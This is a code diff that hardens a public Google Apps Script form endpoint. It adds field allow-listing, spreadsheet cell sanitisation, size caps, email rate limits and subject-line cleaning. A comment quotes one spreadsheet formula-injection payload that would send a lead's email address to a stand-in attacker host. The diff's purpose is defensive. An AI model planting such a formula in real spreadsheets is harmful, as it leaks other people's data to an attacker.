@@ -6,9 +6,35 @@
  * a fixed set of columns and silently discarded any field it did not recognise
  * - which is how "company" and "quantity" would otherwise vanish.
  *
- * This version reads the keys off the payload and adds a column for anything it
- * has not seen before, so adding a field to the form never again needs a change
- * here. Nothing is dropped.
+ * This version reads the keys off the payload and adds a column for anything on
+ * the ALLOWED list, so adding a field to the form is a one-line change here
+ * rather than a rewrite. Nothing on that list is dropped.
+ *
+ * ---------------------------------------------------------------------------
+ * WHY THE PAYLOAD IS FILTERED AND EVERY CELL IS SANITISED
+ * ---------------------------------------------------------------------------
+ * This endpoint is deployed "Who has access: Anyone", because the browser has
+ * to be able to POST to it without a credential. That is not a mistake to fix -
+ * it is what a public enquiry form requires - but it does mean every byte
+ * arriving here was written by a stranger, and two things follow from that:
+ *
+ * 1. A cell beginning = + - or @ is a FORMULA to Google Sheets, not text. A
+ *    name submitted as =IMPORTDATA("https://evil/"&ENCODEURL(B2)) executes when
+ *    the desk opens the sheet and sends another lead's email address to whoever
+ *    wrote it; HYPERLINK() puts a phishing link in the cell under a label of
+ *    the attacker's choosing. Every value is therefore prefixed with a single
+ *    quote when it opens with one of those characters, which Sheets stores as
+ *    text and does not display.
+ *
+ * 2. syncHeaders() used to add a column for ANY key on the payload. A single
+ *    POST carrying 20,000 invented keys would push the sheet past its column
+ *    limit, after which every appendRow throws and NO further lead is captured
+ *    - every visitor sent to the WhatsApp fallback instead. Keys are now
+ *    checked against ALLOWED_FIELDS and anything else is counted and dropped.
+ *
+ * Neither guard can reject a lead: a sanitised cell is still the visitor's text
+ * and a dropped key was never a column. The failure this endpoint must never
+ * have is a lost enquiry.
  *
  * ---------------------------------------------------------------------------
  * UPDATING THE EXISTING DEPLOYMENT   (this is the usual case)
@@ -90,6 +116,102 @@ var COLUMN_ORDER = [
   'page'
 ];
 
+/**
+ * The only keys that may become columns. COLUMN_ORDER is the whole set the form
+ * sends; anything else on a payload was not sent by this site's form, so it is
+ * counted and dropped rather than given a column of its own. Add a field here
+ * in the same commit that adds it to floating-form.js.
+ */
+var ALLOWED_FIELDS = COLUMN_ORDER;
+
+/** A lead longer than this is not a lead. Sheets caps a cell at 50,000 chars. */
+var MAX_FIELD_CHARS = 5000;
+
+/** Whole-body cap, checked before JSON.parse so a huge body costs nothing. */
+var MAX_BODY_BYTES = 64 * 1024;
+
+/**
+ * Notification emails allowed per rolling hour. MailApp's daily quota is finite
+ * (100 on a consumer account), so a flood of junk submissions would otherwise
+ * burn it before lunch and the desk would stop being told about the REAL leads
+ * for the rest of the day. Past the cap the lead is still written to the sheet -
+ * only the email is skipped - because a lead in the sheet is recoverable and a
+ * lead that was never captured is not.
+ */
+var MAX_NOTIFY_PER_HOUR = 40;
+
+/**
+ * Makes one value safe to put in a cell.
+ *
+ * Sheets parses a leading = + - or @ as a formula, so a submitted value
+ * starting with one of those is prefixed with a single quote - Sheets stores
+ * that as text and does not render the quote. Leading tabs and carriage
+ * returns get the same treatment: they are stripped by the parser first, which
+ * would expose the character behind them.
+ */
+function sanitizeCell(value) {
+  if (value === undefined || value === null) return '';
+
+  var text = String(value);
+
+  // Objects and arrays would otherwise land as "[object Object]".
+  if (typeof value === 'object') {
+    try {
+      text = JSON.stringify(value);
+    } catch (err) {
+      text = '';
+    }
+  }
+
+  if (text.length > MAX_FIELD_CHARS) {
+    text = text.slice(0, MAX_FIELD_CHARS) + ' [truncated]';
+  }
+
+  if (/^[=+\-@\t\r]/.test(text)) {
+    text = "'" + text;
+  }
+
+  return text;
+}
+
+/** Strips anything that is not an expected field, and sanitises what is left. */
+function cleanPayload(data) {
+  var clean = {};
+  var dropped = 0;
+
+  Object.keys(data).forEach(function (key) {
+    if (ALLOWED_FIELDS.indexOf(key) === -1) {
+      dropped++;
+      return;
+    }
+    clean[key] = sanitizeCell(data[key]);
+  });
+
+  if (dropped) {
+    console.warn('Dropped ' + dropped + ' unrecognised field(s) from a submission.');
+  }
+
+  return clean;
+}
+
+/**
+ * True while the hour still has notification budget left. Counted in the script
+ * cache rather than a property so it expires on its own and needs no cleanup.
+ */
+function notifyBudgetRemains() {
+  try {
+    var cache = CacheService.getScriptCache();
+    var key = 'notify_count';
+    var count = Number(cache.get(key) || 0);
+    if (count >= MAX_NOTIFY_PER_HOUR) return false;
+    cache.put(key, String(count + 1), 3600);
+    return true;
+  } catch (err) {
+    // The cache being unavailable must not stop a notification going out.
+    return true;
+  }
+}
+
 function doPost(e) {
   var lock = LockService.getScriptLock();
 
@@ -106,11 +228,24 @@ function doPost(e) {
       return jsonReply({ ok: false, error: 'Empty request body' });
     }
 
-    var data = JSON.parse(e.postData.contents);
+    // Checked before the parse: a multi-megabyte body should cost nothing.
+    if (e.postData.contents.length > MAX_BODY_BYTES) {
+      return jsonReply({ ok: false, error: 'Request body too large' });
+    }
 
-    if (!data.email && !data.phone) {
+    var parsed = JSON.parse(e.postData.contents);
+
+    // A JSON array or a bare string parses fine and would then have its indices
+    // read as field names. Only an object is a payload.
+    if (!parsed || typeof parsed !== 'object' || Array.isArray(parsed)) {
+      return jsonReply({ ok: false, error: 'Malformed request body' });
+    }
+
+    if (!parsed.email && !parsed.phone) {
       return jsonReply({ ok: false, error: 'Enquiry needs an email or a phone number' });
     }
+
+    var data = cleanPayload(parsed);
 
     var sheet = getSheet();
     var headers = syncHeaders(sheet, data);
@@ -203,9 +338,24 @@ function notify(data, rowNumber) {
   var to = PropertiesService.getScriptProperties().getProperty('NOTIFY_EMAIL');
   if (!to) return;
 
+  if (!notifyBudgetRemains()) {
+    // The lead is already in the sheet; only the alert is skipped. Logged so a
+    // flood is visible in Executions rather than looking like a quiet hour.
+    console.warn('Notification skipped: hourly cap reached. Lead #' + rowNumber + ' is in the sheet.');
+    return;
+  }
+
+  // The subject carries two visitor-supplied fields, so it is the one place an
+  // attacker could write a line of their own choosing into the desk's inbox
+  // list - "Website enquiry #7 - ACTION REQUIRED: verify your account". Newlines
+  // out, length capped, so it stays a subject line and reads as one.
+  var tidy = function (value) {
+    return String(value || '').replace(/[\r\n]+/g, ' ').trim().slice(0, 80);
+  };
+
   var subject = 'Website enquiry #' + rowNumber +
-    (data.company ? ' - ' + data.company : '') +
-    (data.country ? ' (' + data.country + ')' : '');
+    (data.company ? ' - ' + tidy(data.company) : '') +
+    (data.country ? ' (' + tidy(data.country) + ')' : '');
 
   var lines = [
     'Name:     ' + (data.name || '-'),
